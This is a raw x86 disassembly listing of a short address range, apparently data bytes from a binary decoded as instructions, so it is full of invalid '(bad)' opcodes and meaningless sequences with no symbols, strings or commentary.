  417d23:	call   DWORD PTR [edi]
  417d25:	add    al,0x0
  417d27:	add    DWORD PTR [edi],edx
  417d29:	add    al,0x0
  417d2b:	add    DWORD PTR [edi],esp
  417d2d:	add    al,0xfd
  417d2f:	jmp    DWORD PTR [ebx]
  417d31:	add    al,0x0
  417d33:	add    BYTE PTR [edi],dl
  417d35:	nop
  417d36:	std    
  417d37:	call   DWORD PTR [edi]
  417d39:	nop
  417d3a:	(bad)  
  417d3b:	jmp    ebx
  417d3d:	add    eax,DWORD PTR [eax]
  417d3f:	add    ebx,esp
  417d41:	add    edi,ebp
  417d43:	call   edi
  417d45:	(bad)  
  417d46:	inc    BYTE PTR [eax]
  417d48:	xlat   BYTE PTR ds:[ebx]
  417d49:	add    eax,DWORD PTR [eax]
  417d4b:	add    bl,ah
  417d4d:	add    edi,ebp
  417d4f:	add    bl,ah
  417d51:	(bad)  
  417d52:	inc    BYTE PTR [eax]
  417d54:	cli    
  417d55:	popf   
  417d56:	add    DWORD PTR [eax],eax
  417d58:	sti    
  417d59:	popf   
  417d5a:	add    DWORD PTR [eax],eax
  417d5c:	sti    
  417d5d:	popf   
  417d5e:	std    
  417d5f:	jmp    FWORD PTR [ebp-0x500fe57]
  417d65:	popf   
  417d66:	add    edi,edi
  417d68:	popf   
  417d69:	popf   
  417d6a:	std    
  417d6b:	(bad)  
  417d6c:	xchg   ebp,eax
  417d6d:	mov    eax,ds:0x9dfb0001
  417d72:	std    
  417d73:	inc    DWORD PTR [ebp+0x1a1]
	...
  417d89:	add    dl,bh
  417d8b:	test   eax,0xa1fafffd
  417d90:	std    
  417d91:	(bad)  
  417d92:	ins    DWORD PTR es:[edi],dx
  417d93:	test   eax,0xa1fafefd
  417d98:	add    edi,edi
  417d9a:	pop    ebp
  417d9b:	popf   
  417d9c:	add    edi,edi
  417d9e:	cli    
  417d9f:	mov    eax,ds:0xa9fafffd
  417da4:	add    DWORD PTR [eax],eax
  417da6:	sti    
  417da7:	mov    eax,ds:0xa93dfffd
  417dac:	std    
  417dad:	(bad)  
  417dae:	xor    eax,0xfafefd9d
  417db3:	test   eax,0x9d25fffd
  417db8:	std    
  417db9:	(bad)  
  417dba:	cli    
  417dbb:	popf   
  417dbc:	std    
  417dbd:	(bad)  
  417dbe:	cli    
  417dbf:	popf   
  417dc0:	add    DWORD PTR [eax],eax
  417dc2:	cli    
  417dc3:	test   eax,0x9d05ff01
  417dc8:	std    
  417dc9:	(bad)  
  417dca:	std    
  417dcb:	pushf  
  417dcc:	add    DWORD PTR [eax],eax
  417dce:	cli    
  417dcf:	lahf   
  417dd0:	add    edi,edi
  417dd2:	cli    
  417dd3:	mov    ebx,0x9c7a1081
  417dd8:	add    DWORD PTR [eax],0x819c7a
  417dde:	cli    
  417ddf:	add    al,0x7
  417de1:	test   dl,ch
  417de3:	add    al,0xe7
  417de5:	add    ebp,edx
  417de7:	add    al,0x7
  417de9:	add    al,0xfa
  417deb:	add    al,0x7
  417ded:	add    al,0x0
	...
  417dff:	add    BYTE PTR [edx],cl
  417e01:	test   DWORD PTR [edi],eax
  417e03:	test   dl,bh
  417e05:	test   BYTE PTR [edi],al
  417e07:	add    al,0xfa
  417e09:	test   BYTE PTR [edi],al
  417e0b:	test   BYTE PTR [edx],cl
  417e0d:	test   edi,esp
  417e0f:	sub    edx,0xffffff84
  417e12:	out    0x3,eax
  417e14:	cli    
  417e15:	test   bh,ah
  417e17:	cmp    edx,0xffffff84
  417e1a:	out    0x3,eax
  417e1c:	jmp    0xc704:0xfa03c704
  417e23:	add    ecx,DWORD PTR [edx]
  417e25:	test   edi,esp
  417e27:	or     DWORD PTR [edx],0x5
  417e2a:	mov    DWORD PTR [ebx],0x83c7050a
  417e30:	cli    
  417e31:	test   bh,ah
  417e33:	add    edi,edx
  417e35:	add    al,0xe7
  417e37:	add    edi,edx
  417e39:	test   bh,ah
  417e3b:	cmp    edx,0x4
  417e3e:	pop    es
  417e3f:	test   BYTE PTR [edx],cl
  417e41:	add    eax,0x850a03e7
  417e46:	pop    es
  417e47:	add    al,0xa
  417e49:	add    eax,0x84fa0407
  417e4e:	out    0x3,eax
  417e50:	cli    
  417e51:	add    al,0xe7
  417e53:	sub    edx,0x4
  417e56:	mov    DWORD PTR [ebx-0x7c18fb06],0x3e784ea
  417e60:	or     al,BYTE PTR [ebp+0x83c7]
	...
  417e76:	cli    
  417e77:	add    al,0xe7
  417e79:	add    edi,edx
  417e7b:	add    al,0x0
  417e7d:	leave  
  417e7e:	jns    0x417e74
  417e80:	dec    eax
  417e82:	stc    
  417e83:	hlt    
  417e84:	jg     0x417e6f
  417e86:	stc    
  417e87:	hlt    
  417e88:	dec    DWORD PTR [eax]
  417e8a:	jle    0x417e90
  417e8c:	sub    cl,0xf9
  417e8f:	hlt    
  417e90:	jg     0x417e7b
  417e92:	jns    0x417e88
  417e94:	jg     0x417e7f
  417e96:	jns    0x417e9c
  417e98:	add    cl,ch
  417e9a:	stc    
  417e9b:	hlt    
  417e9c:	jg     0x417e87
  417e9e:	jns    0x417ea4
  417ea0:	or     BYTE PTR [ecx],0xfe
  417ea3:	add    al,0x0
  417ea5:	leave  
  417ea6:	jns    0x417e9c
  417ea8:	jg     0x417e73
  417eaa:	jns    0x417ea0
  417eac:	dec    eax
  417eae:	stc    
  417eaf:	add    al,0x0
  417eb1:	jmp    0xe941832f
  417eb6:	stc    
  417eb7:	add    al,0x80
  417eb9:	leave  
  417eba:	jns    0x417ec0
  417ebc:	add    cl,ch
  417ebe:	jns    0x417eb4
  417ec0:	jg     0x417eab
  417ec2:	stc    
  417ec3:	hlt    
  417ec4:	dec    DWORD PTR [eax]
  417ec6:	test   BYTE PTR [eax+eax*4],0x9
  417eca:	(bad)  
  417ecb:	hlt    
  417ecc:	dec    DWORD PTR [eax]
  417ece:	jbe    0x417ed4
  417ed0:	or     BYTE PTR [ecx],0xfe
  417ed3:	add    al,0x80
  417ed5:	or     esi,esi
  417ed7:	hlt    
  417ed8:	(bad)  
  417ed9:	call   0x417ede
	...
  417eea:	add    BYTE PTR [eax],al
  417eec:	jns    0x417ee2
  417eee:	(bad)  
  417eef:	call   0xe94183ed
  417ef4:	jns    0x417efa
  417ef6:	or     cl,0x79
  417ef9:	add    al,0x0
  417efb:	jmp    0xc9c183f9
  417f00:	stc    
  417f01:	hlt    
  417f02:	jg     0x417ecd
  417f04:	jns    0x417efb
  417f06:	jg     0x417f08
  417f08:	jecxz  0x417e92
  417f0a:	adc    BYTE PTR [eax],al
  417f0c:	jmp    0x417f14
  417f0e:	add    BYTE PTR [eax],al
  417f10:	rol    DWORD PTR [esi],cl
  417f12:	add    cl,BYTE PTR [eax]
  417f14:	jecxz  0x417f1e
  417f16:	add    BYTE PTR [eax],al
  417f18:	retf   
  417f19:	or     BYTE PTR [edx],al
  417f1b:	or     bl,dl
  417f1d:	push   es
  417f1e:	add    BYTE PTR [eax],cl
  417f20:	ror    DWORD PTR [eax],cl
  417f22:	add    BYTE PTR [eax],al
  417f24:	fwait
  417f25:	push   es
  417f26:	add    al,BYTE PTR [eax]
  417f28:	mov    ds:0xab080006,eax
  417f2d:	or     BYTE PTR [edx],al
  417f2f:	add    BYTE PTR [ebx-0x64f7fff8],bl
  417f35:	or     BYTE PTR [eax],al
  417f37:	or     BYTE PTR [ebx-0x74fffdf8],ah
  417f3d:	push   es
  417f3e:	add    cl,BYTE PTR [eax]
  417f40:	fwait
  417f41:	or     BYTE PTR [edx],al
  417f43:	add    BYTE PTR [ebx+0x8],ah
  417f46:	add    cl,BYTE PTR [eax]
  417f48:	imul   eax,DWORD PTR [esi],0x0
  417f4b:	add    BYTE PTR [ebx+0x8],dl
  417f4e:	add    BYTE PTR [eax],cl
	...
  417f60:	add    BYTE PTR [eax],al
  417f62:	pop    ebx
  417f63:	or     BYTE PTR [eax],al
  417f65:	add    BYTE PTR [ebx+0x6],ah
  417f68:	add    cl,BYTE PTR [eax]
  417f6a:	arpl   WORD PTR [esi],ax
  417f6c:	add    BYTE PTR [eax],al
  417f6e:	push   ebx
  417f6f:	push   es
  417f70:	add    al,BYTE PTR [eax]
  417f72:	push   ebx
  417f73:	or     BYTE PTR [edx],al
  417f75:	or     BYTE PTR [ebx],bl
  417f77:	or     BYTE PTR [edx],al
  417f79:	or     BYTE PTR [ebx],ch
  417f7b:	push   es
  417f7c:	add    al,BYTE PTR [eax]
  417f7e:	sub    eax,DWORD PTR [esi]
  417f80:	add    BYTE PTR [eax],cl
  417f82:	adc    eax,DWORD PTR [esi]
  417f84:	add    al,BYTE PTR [eax]
  417f86:	and    ecx,DWORD PTR [eax]
  417f88:	add    al,BYTE PTR [eax]
  417f8a:	or     eax,DWORD PTR [esi]
  417f8c:	add    BYTE PTR [eax],cl
  417f8e:	or     ecx,DWORD PTR [eax]
  417f90:	add    BYTE PTR [eax],al
  417f92:	cli    
  417f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f94:	inc    DWORD PTR [ecx]
  417f96:	add    bl,BYTE PTR [esi-0x62050001]
  417f9c:	add    DWORD PTR [eax],eax
  417f9e:	repnz popf 
  417fa0:	inc    DWORD PTR [ecx]
  417fa2:	repnz popf 
  417fa4:	add    DWORD PTR [eax],eax
  417fa6:	add    ah,BYTE PTR [esi-0x6a05fdff]
  417fac:	(bad)  
  417fad:	(bad)  
  417fae:	cli    
  417faf:	popf   
  417fb0:	add    DWORD PTR [edx],eax
  417fb2:	cli    
  417fb3:	popf   
  417fb4:	inc    DWORD PTR [ecx]
  417fb6:	add    bl,BYTE PTR [esi-0x61fd0001]
  417fbc:	add    DWORD PTR [eax],eax
  417fbe:	cli    
  417fbf:	popf   
  417fc0:	(bad)  
  417fc1:	(bad)  
  417fc2:	cli    
  417fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fc4:	add    DWORD PTR [edx],eax
	...
  417fd6:	add    BYTE PTR [eax],al
  417fd8:	cli    
  417fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fda:	inc    DWORD PTR [ecx]
  417fdc:	add    bl,BYTE PTR [esi-0x6a0d0001]
  417fe2:	add    DWORD PTR [eax],eax
  417fe4:	repnz popf 
  417fe6:	(bad)  
  417fe7:	(bad)  
  417fe8:	cli    
  417fe9:	popf   
  417fea:	add    DWORD PTR [eax],eax
  417fec:	cli    
  417fed:	xchg   ebp,eax
  417fee:	add    DWORD PTR [edx],eax
  417ff0:	repnz xchg ebp,eax
  417ff2:	(bad)  
  417ff3:	push   edx
  417ff5:	popf   
  417ff6:	add    DWORD PTR [edx],eax
  417ff8:	cli    
  417ff9:	popf   
  417ffa:	add    DWORD PTR [eax],eax
  417ffc:	add    dl,BYTE PTR [esi-0x6a0dfe01]
  418002:	add    DWORD PTR [eax],eax
  418004:	cli    
  418005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418006:	inc    DWORD PTR [ecx]
  418008:	cli    
  418009:	popf   
  41800a:	inc    DWORD PTR [ecx]
  41800c:	cli    
  41800d:	xchg   ebp,eax
  41800e:	add    DWORD PTR [eax],eax
  418010:	repnz popf 
  418012:	add    DWORD PTR [edx],eax
  418014:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418016:	(bad)  
  418017:	inc    DWORD PTR [edx]
  418019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41801a:	(bad)  
  41801b:	(bad)  
  41801c:	cli    
  41801d:	add    al,0xe7
  41801f:	add    edi,eax
  418021:	cld    
  418022:	out    dx,al
  418023:	add    eax,edi
  418025:	add    al,0xdf
  418027:	add    edi,edx
  418029:	add    al,0xdf
  41802b:	add    edi,eax
  41802d:	cld    
  41802e:	out    0x1,al
  418030:	clc    
  418031:	add    al,0xe8
  418033:	jecxz  0x418092
  418035:	add    eax,0x8ad5e368
  41803a:	push   0xe3
	...
  41804b:	add    BYTE PTR [eax],al
  41804d:	add    ch,cl
  41804f:	mov    ah,BYTE PTR [edi+0x4]
  418052:	cli    
  418053:	add    al,0x67
  418055:	in     al,0x3d
  418057:	add    eax,0x57a0468
  41805c:	call   0xe846fa64
  418061:	jecxz  0x418008
  418063:	mov    ah,bh
  418065:	add    edi,edx
  418067:	add    al,0xe7
  418069:	jecxz  0x418080
  41806b:	add    eax,0x50de3e7
  418070:	push   0x680505e4
  418075:	add    al,0xfa
  418077:	add    al,0xe7
  418079:	add    edi,edx
  41807b:	add    al,0x67
  41807d:	add    al,0x7a
  41807f:	add    eax,0x57a03e8
  418084:	call   0xe7467a8c
  418089:	jecxz  0x4180e0
  41808b:	mov    ah,bh
  41808d:	add    edi,DWORD PTR [edx+0x5]
  418090:	call   0x67464678
  418095:	add    al,0xfa
  418097:	add    al,0xe7
  418099:	add    edi,DWORD PTR [edx+0x5]
  41809c:	call   0x67cbae84
  4180a1:	in     al,0x25
  4180a3:	mov    ch,BYTE PTR [eax+0x4]
  4180a6:	jp     0x4180ad
  4180a8:	add    al,ch
  4180aa:	stc    
  4180ab:	add    al,0x0
  4180ad:	imul   edx,DWORD PTR [esi],0x69fd8a
	...
  4180c3:	add    dh,bh
  4180c5:	test   BYTE PTR [eax],al
  4180c7:	jmp    0x6a3f0ae5
  4180cc:	fimul  WORD PTR [ecx]
  4180ce:	add    BYTE PTR [eax-0x2a],ch
  4180d1:	or     DWORD PTR [eax],eax
  4180d3:	push   0x690004fe
  4180d8:	test   BYTE PTR [eax+eax*1+0x84f9e8],0xe9
  4180e0:	(bad)  [ecx]
  4180e2:	add    BYTE PTR [eax-0x27],ch
  4180e5:	or     DWORD PTR [eax],eax
  4180e7:	push   0xe90004f9
  4180ec:	stc    
  4180ed:	add    al,0x0
  4180ef:	jmp    0xe94185ed
  4180f4:	cdq    
  4180f5:	or     DWORD PTR [eax],eax
  4180f7:	imul   ebx,DWORD PTR [ecx-0x6960277],0xf9680084
  418101:	test   BYTE PTR [eax],al
  418103:	call   0xe8418601
  418108:	cdq    
  418109:	or     DWORD PTR [eax],eax
  41810b:	push   0x68fd8959
  418110:	pop    ecx
  418111:	mov    ebp,edi
  418113:	imul   edi,ecx,0x59680004
  418119:	or     DWORD PTR [eax],eax
  41811b:	push   0xe80004f9
  418120:	stc    
  418121:	add    al,0x0
  418123:	jmp    0xe93f0a81
	...
  418138:	add    BYTE PTR [eax],al
  41813a:	stc    
  41813b:	test   BYTE PTR [eax],al
  41813d:	call   0x6a3f0a5b
  418142:	sbb    DWORD PTR [ecx],ecx
  418144:	add    BYTE PTR [eax],al
  418146:	xchg   edx,eax
  418147:	add    eax,0xa5120080
  41814c:	std    
  41814d:	jmp    DWORD PTR [ebx+0x23fffda5]
  418153:	add    eax,0xa5120080
  418158:	jge    0x41815a
  41815a:	xchg   ebx,eax
  41815b:	add    eax,0x4e30000
  418160:	add    BYTE PTR [eax],0xe3
  418163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418164:	std    
  418165:	call   DWORD PTR [ebx-0x5c]
  418168:	jge    0x41816a
  41816a:	rol    DWORD PTR [ecx],cl
  41816c:	add    BYTE PTR [eax],al
  41816e:	jecxz  0x418171
  418170:	or     BYTE PTR [edx],al
  418172:	jecxz  0x418178
  418174:	or     BYTE PTR [edx],al
  418176:	rol    DWORD PTR [ebx],cl
  418178:	add    BYTE PTR [edx-0x2d],al
  41817b:	add    al,0x8
  41817d:	add    BYTE PTR [ebx-0x5cfffffd],ah
  418183:	add    al,0x0
  418185:	inc    eax
  418186:	xchg   ebx,eax
  418187:	add    al,0x8
  418189:	add    dl,BYTE PTR [ebx-0x5cbff7fd]
  41818f:	add    al,0x8
  418191:	add    BYTE PTR [ebx-0x6cfdfffd],ah
  418197:	add    ecx,DWORD PTR [eax]
  418199:	inc    eax
  41819a:	xchg   ebx,eax
  41819b:	add    eax,DWORD PTR [eax]
  41819d:	inc    edx
	...
  4181ae:	add    BYTE PTR [eax],al
  4181b0:	arpl   WORD PTR [eax+ecx*1],ax
  4181b3:	inc    edx
  4181b4:	arpl   WORD PTR [ebx],ax
  4181b6:	or     BYTE PTR [eax],al
  4181b8:	push   ebx
  4181b9:	add    al,0x0
  4181bb:	inc    eax
  4181bc:	push   ebx
  4181bd:	add    al,0x0
  4181bf:	add    ah,BYTE PTR [ebx+0x4]
  4181c2:	or     BYTE PTR [eax+0x63],al
  4181c5:	add    al,0x8
  4181c7:	inc    eax
  4181c8:	push   ebx
  4181c9:	add    al,0x0
  4181cb:	add    BYTE PTR [ebx+0x3],dl
  4181ce:	add    BYTE PTR [eax-0x6],al
  4181d1:	popf   
  4181d2:	add    cl,BYTE PTR [eax]
  4181d4:	mov    eax,0xb808029d
  4181d9:	popf   
  4181da:	add    al,BYTE PTR [eax]
  4181dc:	clc    
  4181dd:	popf   
  4181de:	add    DWORD PTR [eax],ecx
  4181e0:	mov    eax,0xba00029d
  4181e5:	popf   
  4181e6:	add    DWORD PTR [eax],eax
  4181e8:	cli    
  4181e9:	popf   
  4181ea:	add    DWORD PTR [eax],eax
  4181ec:	mov    eax,0xf808029d
  4181f1:	popf   
  4181f2:	add    DWORD PTR [eax],eax
  4181f4:	clc    
  4181f5:	popf   
  4181f6:	add    DWORD PTR [eax],eax
  4181f8:	cmp    BYTE PTR [esi-0x6205f7fe],bl
  4181fe:	add    DWORD PTR [eax],ecx
  418200:	cli    
  418201:	popf   
  418202:	add    al,BYTE PTR [eax]
  418204:	cmp    BYTE PTR [esi-0x6205fffe],bl
  41820a:	add    DWORD PTR [eax],eax
  41820c:	clc    
  41820d:	popf   
  41820e:	add    DWORD PTR [eax],eax
  418210:	cmp    bl,BYTE PTR [esi+0x801]
	...
  418226:	clc    
  418227:	popf   
  418228:	add    al,BYTE PTR [eax]
  41822a:	cmp    BYTE PTR [esi-0x61c5f7fe],bl
  418230:	add    al,BYTE PTR [eax]
  418232:	clc    
  418233:	popf   
  418234:	add    DWORD PTR [eax],eax
  418236:	cmp    bl,BYTE PTR [esi-0x61c7f7ff]
  41823c:	add    cl,BYTE PTR [eax]
  41823e:	clc    
  41823f:	popf   
  418240:	add    cl,BYTE PTR [eax]
  418242:	mov    edx,0xfa00029d
  418247:	popf   
  418248:	add    DWORD PTR [eax],eax
  41824a:	clc    
  41824b:	popf   
  41824c:	add    DWORD PTR [eax],ecx
  41824e:	mov    eax,0xb808029d
  418253:	popf   
  418254:	add    cl,BYTE PTR [eax]
  418256:	cli    
  418257:	popf   
  418258:	add    DWORD PTR [eax],eax
  41825a:	mov    eax,0xf202e704
  41825f:	inc    edx
  418260:	out    0x3,eax
  418262:	add    al,BYTE PTR [ebx]
  418264:	out    0x3,eax
  418266:	cli    
  418267:	add    al,0xe7
  418269:	add    esi,edx
  41826b:	inc    esp
  41826c:	out    0x3,eax
  41826e:	cli    
  41826f:	inc    edx
  418270:	out    0x2,eax
  418272:	add    al,BYTE PTR ds:0x2fa02e7
  418278:	out    0x2,eax
  41827a:	cli    
  41827b:	inc    esp
  41827c:	out    0x3,eax
  41827e:	repnz add al,0xe7
  418281:	add    edi,edx
  418283:	add    al,0xe7
  418285:	add    eax,DWORD PTR [edx]
  418287:	inc    ebp
  418288:	out    0x2,eax
	...
  41829a:	add    BYTE PTR [eax],al
  41829c:	repnz add ah,bh
  41829f:	add    bh,dl
  4182a1:	inc    esp
  4182a2:	xlat   BYTE PTR ds:[ebx]
  4182a3:	add    edi,edx
  4182a5:	in     al,0xe6
  4182a7:	add    edi,DWORD PTR [edx]
  4182a9:	in     eax,0xe6
  4182ab:	inc    ebx
  4182ac:	cli    
  4182ad:	add    al,0xf7
  4182af:	inc    ebx
  4182b0:	cmp    ah,ch
  4182b2:	out    0x3,al
  4182b4:	cmp    ah,ch
  4182b6:	test   BYTE PTR [ebx],0xfa
  4182b9:	add    al,0xf7
  4182bb:	inc    ebx
  4182bc:	cmp    ah,ch
  4182be:	out    0x3,al
  4182c0:	cmp    al,BYTE PTR ds:0xe4fa43e7
  4182c6:	(bad)  
  4182c7:	inc    ebx
  4182c8:	cmp    al,BYTE PTR ds:0x53a03e7
  4182ce:	test   DWORD PTR [ebx],0x3f6e4fa
  4182d4:	mov    edx,0xfa43e704
  4182d9:	in     al,0xe6
  4182db:	add    edi,edx
  4182dd:	in     al,0xd6
  4182df:	inc    ebx
  4182e0:	cli    
  4182e1:	add    al,0xe7
  4182e3:	add    edi,edx
  4182e5:	add    al,0x0
  4182e7:	fyl2xp1 
  4182e9:	inc    esp
  4182ea:	add    cl,bl
  4182ec:	mov    ecx,0xb9e92004
  4182f1:	add    al,0x0
  4182f3:	jmp    0xf941c7b1
  4182f8:	mov    ecx,0xf9f92004
  4182fd:	add    al,0x0
  4182ff:	fld    DWORD PTR [eax]
	...
  418311:	add    cl,bh
  418313:	inc    esp
  418314:	and    cl,bl
  418316:	stc    
  418317:	inc    esp
  418318:	and    cl,ch
  41831a:	stc    
  41831b:	add    al,0x0
  41831d:	fnstcw WORD PTR [ecx-0x4616ffbc]
  418323:	inc    esp
  418324:	and    cl,bh
  418326:	cmp    DWORD PTR ds:0x4539e900,eax
  41832c:	add    cl,ch
  41832e:	cmp    DWORD PTR [ebp+0x20],eax
  418331:	jmp    0xe961882f
  418336:	cmp    DWORD PTR ds:0x4f9d920,eax
  41833c:	add    cl,bl
  41833e:	stc    
  41833f:	inc    esp
  418340:	and    cl,ch
  418342:	cmp    DWORD PTR [ebp+0x0],eax
  418345:	stc    
  418346:	cmp    DWORD PTR [ebp+0x20],eax
  418349:	jmp    0xf941c847
  41834e:	cmp    DWORD PTR ds:0x4f9d900,eax
  418354:	and    cl,ch
  418356:	stc    
  418357:	inc    esp
  418358:	add    cl,ch
  41835a:	cmp    DWORD PTR ds:0x4f9e920,eax
  418360:	and    cl,bh
  418362:	cmp    DWORD PTR ds:0x4f9f900,eax
  418368:	and    cl,bh
  41836a:	mov    ecx,0xb9e92044
  41836f:	inc    esp
  418370:	add    BYTE PTR [eax],al
  418372:	push   ebx
  418373:	add    DWORD PTR [eax+0x20],eax
	...
  418386:	add    BYTE PTR [eax],al
  418388:	xor    eax,DWORD PTR [ecx+0x40]
  41838b:	add    BYTE PTR [ebx+0x41],ah
  41838e:	inc    eax
  41838f:	and    BYTE PTR [ebx+0x1],dl
  418392:	add    BYTE PTR [eax],al
  418394:	inc    ebx
  418395:	add    DWORD PTR [eax+0x20],eax
  418398:	xor    eax,DWORD PTR [ecx]
  41839a:	add    BYTE PTR [eax],al
  41839c:	and    eax,DWORD PTR [ecx+0x0]
  41839f:	add    BYTE PTR [ebx],dl
  4183a1:	add    DWORD PTR [eax+0x20],eax
  4183a4:	inc    ebx
  4183a5:	inc    ecx
  4183a6:	inc    eax
  4183a7:	add    BYTE PTR [ebx],ah
  4183a9:	inc    ecx
  4183aa:	add    BYTE PTR [eax],al
  4183ac:	xor    eax,DWORD PTR [ecx]
  4183ae:	inc    eax
  4183af:	add    BYTE PTR [ebx],ah
  4183b1:	inc    ecx
  4183b2:	add    BYTE PTR [eax],ah
  4183b4:	adc    eax,DWORD PTR [ecx]
  4183b6:	add    BYTE PTR [eax],al
  4183b8:	jecxz  0x418382
  4183ba:	aas    
  4183bb:	and    bl,ah
  4183bd:	or     BYTE PTR [eax],al
  4183bf:	and    bl,ah
  4183c1:	or     BYTE PTR [eax+0x0],al
  4183c4:	ret    
  4183c5:	enter  0x1fff,0xe3
  4183c9:	or     BYTE PTR [eax],ah
  4183cb:	add    cl,ah
  4183cd:	or     BYTE PTR [eax],ah
  4183cf:	add    al,0xd1
  4183d1:	cmp    ch,0x3
  4183d4:	ror    DWORD PTR [eax],cl
  4183d6:	add    BYTE PTR [eax],al
  4183d8:	mov    ds:0xa1fffd80,eax
  4183dd:	cmp    ch,0x3
  4183e0:	xchg   ecx,eax
  4183e1:	sbb    BYTE PTR ds:0x1d809300,0x4
  4183e8:	mov    eax,ds:0x41d80
	...
  4183fd:	add    BYTE PTR [ebx-0x6cffdff8],ah
  418403:	or     BYTE PTR [eax],al
  418405:	add    BYTE PTR [ecx+0x61040008],dl
  41840b:	or     BYTE PTR [eax],al
  41840d:	add    dl,bh
  41840f:	ins    DWORD PTR es:[edi],dx
  418410:	add    DWORD PTR [eax],eax
  418412:	(bad)  
  418413:	outs   dx,DWORD PTR ds:[esi]
  418414:	add    DWORD PTR [eax],esp
  418416:	imul   BYTE PTR [edi-0x7]
  418419:	call   DWORD PTR [ebp+0x6e]
  41841c:	stc    
  41841d:	(bad)  
  41841e:	stc    
  41841f:	outs   dx,DWORD PTR ds:[esi]
  418420:	stc    
  418421:	pop    ds
  418422:	cli    
  418423:	outs   dx,DWORD PTR ds:[esi]
  418424:	add    DWORD PTR [eax],esp
  418426:	cli    
  418427:	ins    DWORD PTR es:[edi],dx
  418428:	stc    
  418429:	(bad)  
  41842a:	stc    
  41842b:	outs   dx,DWORD PTR ds:[esi]
  41842c:	add    DWORD PTR [eax],eax
  41842e:	imul   BYTE PTR [ebp+0x1]
  418431:	and    dh,bh
  418433:	ins    DWORD PTR es:[edi],dx
  418434:	stc    
  418435:	pop    ds
  418436:	imul   BYTE PTR [edi+0x1]
  418439:	and    dl,bh
  41843b:	ins    DWORD PTR es:[edi],dx
  41843c:	add    DWORD PTR [eax],esp
  41843e:	imul   BYTE PTR [ebp-0x7]
  418441:	inc    DWORD PTR ds:0xfdfff970
  418447:	outs   dx,DWORD PTR ds:[esi]
  418448:	stc    
  418449:	pop    ds
  41844a:	(bad)  
  41844b:	ins    DWORD PTR es:[edi],dx
  41844c:	stc    
  41844d:	pop    ds
  41844e:	cli    
  41844f:	outs   dx,DWORD PTR ds:[esi]
  418450:	add    DWORD PTR [eax],eax
  418452:	cli    
  418453:	ins    DWORD PTR es:[edi],dx
  418454:	add    DWORD PTR [eax],eax
  418456:	imul   BYTE PTR [ebp-0x7]
  418459:	pop    ds
  41845a:	cli    
  41845b:	ins    DWORD PTR es:[edi],dx
  41845c:	add    DWORD PTR [eax],eax
  41845e:	imul   BYTE PTR [ebp-0x7]
  418461:	pop    ds
	...
  418472:	add    BYTE PTR [eax],al
  418474:	cli    
  418475:	ins    DWORD PTR es:[edi],dx
  418476:	add    DWORD PTR [eax],esp
  418478:	cli    
  418479:	outs   dx,DWORD PTR ds:[esi]
  41847a:	stc    
  41847b:	(bad)  
  41847c:	stc    
  41847d:	outs   dx,DWORD PTR ds:[esi]
  41847e:	stc    
  41847f:	(bad)  
  418480:	stc    
  418481:	outs   dx,DWORD PTR ds:[esi]
  418482:	add    DWORD PTR [eax],esp
  418484:	(bad)  
  418485:	outs   dx,DWORD PTR ds:[esi]
  418486:	add    DWORD PTR [eax],esp
  418488:	imul   BYTE PTR [edi+0x1]
  41848b:	add    dl,bh
  41848d:	outs   dx,DWORD PTR ds:[esi]
  41848e:	add    DWORD PTR [eax],esp
  418490:	cli    
  418491:	ins    DWORD PTR es:[edi],dx
  418492:	add    DWORD PTR [eax],eax
  418494:	(bad)  
  418495:	ins    DWORD PTR es:[edi],dx
  418496:	stc    
  418497:	(bad)  
  418498:	stc    
  418499:	add    al,0xe7
  41849b:	add    ebx,DWORD PTR [edx]
  41849d:	add    eax,0x90dfbe7
  4184a2:	jmp    0xe9c4eaa2
  4184a7:	sti    
  4184a8:	std    
  4184a9:	add    al,0xe7
  4184ab:	sti    
  4184ac:	cmc    
  4184ad:	or     cl,ch
  4184af:	sti    
  4184b0:	dec    ebp
  4184b1:	sub    ecx,0x3
  4184b4:	cli    
  4184b5:	or     cl,ch
  4184b7:	sti    
  4184b8:	fisttp QWORD PTR [eax]
  4184ba:	out    0x3,eax
  4184bc:	fimul  DWORD PTR [eax]
  4184be:	out    0xfb,eax
  4184c0:	or     eax,0xfa03e705
  4184c5:	add    al,0xe9
  4184c7:	add    edi,edx
  4184c9:	add    al,0xe9
  4184cb:	sti    
  4184cc:	cmc    
  4184cd:	or     bh,ah
  4184cf:	add    edi,edx
  4184d1:	add    al,0xe9
  4184d3:	sti    
  4184d4:	in     eax,0x4
  4184d6:	out    0x3,eax
	...
  4184e8:	add    BYTE PTR [eax],al
  4184ea:	fimul  DWORD PTR [eax]
  4184ec:	out    0xfb,eax
  4184ee:	cmc    
  4184ef:	sub    cl,0x3
  4184f2:	cli    
  4184f3:	or     bh,ah
  4184f5:	sti    
  4184f6:	in     eax,0x6
  4184f8:	out    0xfb,eax
  4184fa:	fld    QWORD PTR [edx+0x51a03e9]
  418500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418501:	repz int 0x12
  418504:	out    0xf3,eax
  418506:	lds    eax,FWORD PTR [edx+0x4f603e7]
  41850c:	daa    
  41850d:	hlt    
  41850e:	stc    
  41850f:	adc    al,0xe7
  418511:	add    edi,edx
  418513:	adc    al,0x27
  418515:	hlt    
  418516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418517:	adc    ah,BYTE PTR [edi]
  418519:	add    al,0xfa
  41851b:	add    al,0xe7
  41851d:	add    edi,edx
  41851f:	adc    al,0x27
  418521:	add    al,0xf6
  418523:	add    al,0x0
  418525:	jmp    0x29518e23
  41852a:	xchg   BYTE PTR [esi],al
  41852c:	adc    cl,ch
  41852e:	imul   eax,DWORD PTR [esi],0x669e900
  418534:	adc    BYTE PTR [ecx],ch
  418536:	outs   dx,BYTE PTR ds:[esi]
  418537:	push   es
  418538:	add    cl,ch
  41853a:	imul   eax,DWORD PTR [edx+0x4fe29fd],0x8f9e900
  418544:	adc    BYTE PTR [ecx],ch
  418546:	inc    BYTE PTR [eax+edx*1]
  418549:	jmp    0xa94f0797
	...
  41855e:	add    BYTE PTR [eax],al
  418560:	sub    DWORD PTR [edx+0x629e9fd],eax
  418566:	add    BYTE PTR [ecx-0x56fff707],ch
  41856c:	stc    
